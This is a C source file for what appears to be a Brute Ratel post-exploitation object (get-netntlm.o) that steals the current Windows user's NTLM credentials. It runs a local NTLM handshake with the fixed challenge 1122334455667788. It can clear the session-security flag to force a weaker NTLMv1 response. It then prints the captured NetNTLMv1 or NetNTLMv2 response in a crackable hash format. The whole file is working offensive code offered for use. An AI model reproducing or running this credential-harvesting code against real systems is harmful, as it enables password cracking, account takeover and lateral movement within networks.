#define SECURITY_WIN32
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security.h>
#include <stdint.h>
#include "../badger_exports.h"

extern WCHAR** g_dispatch;

DECLSPEC_IMPORT void __cdecl Msvcrt$free(void *_Memory);
DECLSPEC_IMPORT _CRTIMP int __cdecl Msvcrt$sscanf_s(const char *_Src,const char *_Format,...);
DECLSPEC_IMPORT int __cdecl Msvcrt$sprintf(char *__stream, const char *__format, ...);
DECLSPEC_IMPORT void *__cdecl Msvcrt$calloc(size_t _NumOfElements, size_t _SizeOfElements);

DECLSPEC_IMPORT SECURITY_STATUS WINAPI Secur32$AcquireCredentialsHandleA(LPCTSTR, LPCTSTR, ULONG, PLUID, PVOID, SEC_GET_KEY_FN, PVOID, PCredHandle, PTimeStamp);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI Secur32$InitializeSecurityContextA(PCredHandle, PCtxtHandle, SEC_CHAR *, ULONG, ULONG, ULONG, PSecBufferDesc, ULONG, PCtxtHandle, PSecBufferDesc, PULONG, PTimeStamp);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI Secur32$AcceptSecurityContext(PCredHandle phCredential, PCtxtHandle phContext, PSecBufferDesc pInput, ULONG fContextReq, ULONG TargetDataRep, PCtxtHandle phNewContext, PSecBufferDesc pOutput, ULONG *pfContextAttr, PTimeStamp ptsExpiry);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI Secur32$FreeCredentialsHandle(PCredHandle phCredential);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI Secur32$DeleteSecurityContext(PCtxtHandle phContext);

#define MAX_TOKEN_SIZE 12288

BYTE* StringToByteArray(char* hex) {
    size_t numChars = BadgerStrlen(hex);
    BYTE* bytes = NULL;
    bytes = (BYTE*)BadgerAlloc(numChars / 2);
    for (size_t i = 0; i < numChars; i += 2) {
        Msvcrt$sscanf_s(hex + i, "%2hhx", &bytes[i / 2]);
    }
    return bytes;
}

char* ByteArrayToString(unsigned char* ba, size_t ba_length) {
    char * hex = NULL;
    hex = (char *)BadgerAlloc(ba_length * 2 + 1);
    if (!hex) {
        return NULL;
    }
    for (size_t i = 0; i < ba_length; ++i) {
        Msvcrt$sprintf(hex + i * 2, "%02x", ba[i]);
    }
    hex[ba_length * 2] = '\0';
    return hex;
}

char* ByteArrayToUnicodeString(const BYTE* ba, size_t ba_length) {
    char * str = NULL;
    str = (char *)BadgerAlloc(ba_length + 1);
    if (!str) {
        return NULL;
    }
    for (size_t i = 0; i < ba_length; i += 2) {
        str[i / 2] = ba[i];
    }
    str[ba_length / 2] = '\0';
    return str;
}

char* FormatNTLMv2Hash(const char* challenge, const BYTE* user, size_t user_length, const BYTE* domain, size_t domain_length, const BYTE* nt_resp, size_t nt_resp_len) {
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wdiscarded-qualifiers"
    char * user_str = NULL;
    char * domain_str = NULL;
    user_str = ByteArrayToUnicodeString(user, user_length); 
    domain_str = ByteArrayToUnicodeString(domain, domain_length); 
    char * result = NULL; 
    result = (char *)Msvcrt$calloc(512,sizeof(char));
    Msvcrt$sprintf(result, "%s::%s:%s:%s:%s", user_str, domain_str, challenge, ByteArrayToString(nt_resp, 16), ByteArrayToString(nt_resp+16, nt_resp_len-16));
    BadgerFree((PVOID*)&user_str);
    BadgerFree((PVOID*)&domain_str);
    #pragma GCC diagnostic pop
    return result;
}

char* FormatNTLMv1Hash(const char* challenge, const BYTE* user, size_t user_length, const BYTE* domain, size_t domain_length, const BYTE* lm_resp, size_t lm_resp_len, const BYTE* nt_resp, size_t nt_resp_len) {
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wdiscarded-qualifiers"
    char * user_str = NULL;
    char * domain_str = NULL;
    user_str = ByteArrayToUnicodeString(user, user_length); 
    domain_str = ByteArrayToUnicodeString(domain, domain_length);
    char * result = NULL; 
    result = (char *)Msvcrt$calloc(512,sizeof(char));
    Msvcrt$sprintf(result, "%s::%s:%s:%s:%s", user_str, domain_str, ByteArrayToString(lm_resp, lm_resp_len), ByteArrayToString(nt_resp, nt_resp_len), challenge);
    BadgerFree((PVOID*)&user_str);
    BadgerFree((PVOID*)&domain_str);
    #pragma GCC diagnostic push
    return result;
}

void ParseNTResponse(BYTE* message, char* challenge) {
    BYTE* lm_resp = NULL;
    BYTE* nt_resp = NULL;
    BYTE* domain = NULL;
    BYTE* user = NULL;
    char* netNTLM = NULL;

    uint16_t lm_resp_len = *(uint16_t *)(message + 12);
    uint32_t lm_resp_off = *(uint32_t *)(message + 16);
    uint16_t nt_resp_len = *(uint16_t *)(message + 20);
    uint32_t nt_resp_off = *(uint32_t *)(message + 24);
    uint16_t domain_len = *(uint16_t *)(message + 28);
    uint32_t domain_off = *(uint32_t *)(message + 32);
    uint16_t user_len = *(uint16_t *)(message + 36);
    uint32_t user_off = *(uint32_t *)(message + 40);

    lm_resp = (BYTE *)BadgerAlloc(lm_resp_len);
    nt_resp = (BYTE *)BadgerAlloc(nt_resp_len); 
    domain = (BYTE *)BadgerAlloc(domain_len); 
    user = (BYTE *)BadgerAlloc(user_len);

    BadgerMemcpy(lm_resp, message + lm_resp_off, lm_resp_len);
    BadgerMemcpy(nt_resp, message + nt_resp_off, nt_resp_len);
    BadgerMemcpy(domain, message + domain_off, domain_len);
    BadgerMemcpy(user, message + user_off, user_len);
    if (nt_resp_len == 24) {
        BadgerDispatch(g_dispatch, "[+] NTLMv1 Response: \n");
        netNTLM = FormatNTLMv1Hash(challenge, user, user_len, domain, domain_len, lm_resp, lm_resp_len, nt_resp, nt_resp_len);
        BadgerDispatch(g_dispatch, "%s\n", netNTLM);
    } else if (nt_resp_len > 24) {
        BadgerDispatch(g_dispatch,"[+] NTLMv2 Response: \n");
        netNTLM = FormatNTLMv2Hash(challenge, user, user_len, domain, domain_len, nt_resp, nt_resp_len);
        BadgerDispatch(g_dispatch, "%s\n", netNTLM);
    } else {
        BadgerDispatch(g_dispatch,"[+] Unknown NTLM Response");
    }
    BadgerFree((PVOID*)&lm_resp);
    BadgerFree((PVOID*)&nt_resp);
    BadgerFree((PVOID*)&domain);
    BadgerFree((PVOID*)&user);
}

BYTE* GetSecBufferByteArray(const SecBufferDesc* pSecBufferDesc, size_t* pBufferSize) {
	if (!pSecBufferDesc) {
		BadgerDispatch(g_dispatch, "[-] SecBufferDesc pointer cannot be null");
        return NULL;
	}

	BYTE* buffer = NULL;
    *pBufferSize = 0;

	if (pSecBufferDesc->cBuffers == 1) {
		SecBuffer* pSecBuffer = pSecBufferDesc->pBuffers;
		if (pSecBuffer->cbBuffer > 0 && pSecBuffer->pvBuffer) {
			buffer  = (BYTE *)BadgerAlloc(pSecBuffer->cbBuffer);
			BadgerMemcpy(buffer, pSecBuffer->pvBuffer, pSecBuffer->cbBuffer);
            *pBufferSize = pSecBuffer->cbBuffer;
		}
	} else {
        BadgerDispatch(g_dispatch, "[-] This was unexpected...");
        return NULL;
    }

	return buffer;
}
BOOL IsCredHandleValid(CredHandle *phCred) {
    return (phCred->dwLower != (ULONG_PTR) -1) && (phCred->dwUpper != (ULONG_PTR) -1);
}

void GetNTLMCreds(BOOL DisableESS){
    char* challenge = "1122334455667788";
    SecBufferDesc ClientToken;
	SecBuffer ClientSecBuffer;
	
    ClientToken.cBuffers = 1;
	ClientToken.ulVersion = SECBUFFER_VERSION;
	ClientToken.pBuffers = &ClientSecBuffer;
	ClientSecBuffer.cbBuffer = MAX_TOKEN_SIZE;
	ClientSecBuffer.pvBuffer = (BYTE *)BadgerAlloc(MAX_TOKEN_SIZE);
	ClientSecBuffer.BufferType = SECBUFFER_TOKEN;

    SecBufferDesc ServerToken;
	SecBuffer ServerSecBuffer = { 0, SECBUFFER_TOKEN, NULL };
	ServerToken.cBuffers = 1;
	ServerToken.ulVersion = SECBUFFER_VERSION;
	ServerToken.pBuffers = &ServerSecBuffer;
	ServerSecBuffer.cbBuffer = MAX_TOKEN_SIZE;
	ServerSecBuffer.pvBuffer = (BYTE *)BadgerAlloc(MAX_TOKEN_SIZE);
	ServerSecBuffer.BufferType = SECBUFFER_TOKEN;

    SECURITY_STATUS SecStatus = 0;
    
    CredHandle hCred, hClientContext, hServerContext;
    hCred.dwLower = 0;
    hCred.dwUpper = 0;
    TimeStamp expiry;
    expiry.HighPart = 0;
    expiry.LowPart = 0;

    ULONG contextAttr = 0;

    SecStatus = Secur32$AcquireCredentialsHandleA(NULL,  "NTLM",  SECPKG_CRED_BOTH,  NULL,  NULL,  0, NULL,  &hCred,  &expiry);
    if (SecStatus != SEC_E_OK){
        BadgerDispatch(g_dispatch, "[-] AcquireCredentialsHandle failed with %x\n", SecStatus);
        return;
    }

    SecStatus = Secur32$InitializeSecurityContextA(&hCred, NULL,  NULL,  ISC_REQ_CONNECTION, 0,  SECURITY_NATIVE_DREP, NULL,  0,  &hClientContext,  &ClientToken,  &contextAttr,  &expiry);
    if (SecStatus != SEC_I_CONTINUE_NEEDED && SecStatus != SEC_E_OK){
        BadgerDispatch(g_dispatch, "[-] InitializeSecurityContext failed with %x\n", SecStatus);
        return;
    }
    SecStatus = Secur32$AcceptSecurityContext(&hCred,  NULL,  &ClientToken,  ISC_REQ_CONNECTION,  SECURITY_NATIVE_DREP,  &hServerContext,  &ServerToken,  &contextAttr,  &expiry);
    if (SecStatus != SEC_E_OK && SecStatus != SEC_I_CONTINUE_NEEDED){
        BadgerDispatch(g_dispatch, "[-] AcceptSecurityContext failed with %x\n", SecStatus);
        return;
    }
    size_t serverMessageSize;
    BYTE *serverMessage = GetSecBufferByteArray(&ServerToken, &serverMessageSize);
    size_t challengeArrayLength;
    BYTE* challengeBytes = StringToByteArray(challenge);
    if (! challengeBytes) {
        BadgerDispatch(g_dispatch, "[-] Failed to convert challenge string to byte array or invalid challenge length.\n");
        goto cleanup;
    }
    if (DisableESS) {
        serverMessage[22] &= 0xF7;
    }
    BadgerMemcpy(serverMessage + 24, challengeBytes, 8);
    BadgerMemset(serverMessage + 32, 0, 16);
    SecBuffer ServerSecBuffer2 = { 0, SECBUFFER_TOKEN, NULL };;
    ServerSecBuffer2.BufferType = SECBUFFER_TOKEN;
    ServerSecBuffer2.cbBuffer = serverMessageSize;
    ServerSecBuffer2.pvBuffer = serverMessage;
	ServerToken.pBuffers = &ServerSecBuffer2;

    SecBuffer ClientSecBuffer2 = { 0, SECBUFFER_TOKEN, NULL };;
	ClientSecBuffer2.pvBuffer = (BYTE *)BadgerAlloc(MAX_TOKEN_SIZE);
	ClientSecBuffer2.cbBuffer = MAX_TOKEN_SIZE;
	ClientSecBuffer2.BufferType = SECBUFFER_TOKEN;
	ClientToken.pBuffers = &ClientSecBuffer2;

    SecStatus = Secur32$InitializeSecurityContextA(&hCred, &hClientContext,  NULL,  ISC_REQ_CONNECTION,  0,  SECURITY_NATIVE_DREP,  &ServerToken,  0,  &hClientContext,  &ClientToken,  &contextAttr, &expiry);
    BadgerDispatch(g_dispatch, "[+] SecStatus: %x\n", SecStatus);

    if (SecStatus == SEC_E_OK) {
        size_t responseSize;
        BYTE* response = GetSecBufferByteArray(&ClientToken, &responseSize); 
        ParseNTResponse(response, challenge);
        BadgerFree((PVOID*)&response);
    } else if (SecStatus == SEC_E_NO_CREDENTIALS) {
        BadgerDispatch(g_dispatch, "[-] The NTLM security package does not contain any credentials\n");
    } else {
        BadgerDispatch(g_dispatch, "[-] InitializeSecurityContext (client) failed. Error: %x\n", SecStatus);
    }

cleanup:
    if (IsCredHandleValid(&hCred)){
        Secur32$FreeCredentialsHandle(&hCred);
    }
    if (IsCredHandleValid(&hClientContext)){
        Secur32$FreeCredentialsHandle(&hClientContext);
    }
    if (IsCredHandleValid(&hServerContext)){
        Secur32$FreeCredentialsHandle(&hServerContext);
    }
    BadgerFree((PVOID*)&ClientSecBuffer.pvBuffer);
    BadgerFree((PVOID*)&ServerSecBuffer.pvBuffer);
    BadgerFree((PVOID*)&ClientSecBuffer2.pvBuffer);
    BadgerFree((PVOID*)&serverMessage);
    BadgerFree((PVOID*)&challengeBytes);
}

void coffee(char** argv, int argc, WCHAR** dispatch) {
    g_dispatch = dispatch;
    if (argc < 1) {
        BadgerDispatch(dispatch, "[!] Usage: get-netntlm.o <DisableESS:true/false>\n[!] Eg.: get-netntlm.o true\n");
        return;
    }
    BOOL DisableESS = FALSE;
    if (BadgerStrcmp(argv[0], "true") == 0) {
        DisableESS = TRUE;
    }
    GetNTLMCreds(DisableESS);
}